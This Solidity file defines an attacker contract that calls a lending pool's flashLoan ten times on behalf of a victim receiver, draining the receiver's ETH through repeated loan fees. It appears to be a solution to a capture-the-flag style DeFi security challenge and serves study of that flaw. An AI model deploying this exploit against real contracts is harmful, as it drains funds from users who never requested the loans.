// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackerNaiveReceiverLenderPool{
  NaiveReceiverLenderPool pool ;
  
  constructor(address payable poolAddress){
    pool = NaiveReceiverLenderPool(poolAddress);
  }
  function attack(IERC3156FlashBorrower _receiver) public{
     for(uint i = 0; i < 10; i++ ) {
        pool.flashLoan(_receiver,pool.ETH(),1 ether, "0x");
    }
  }
}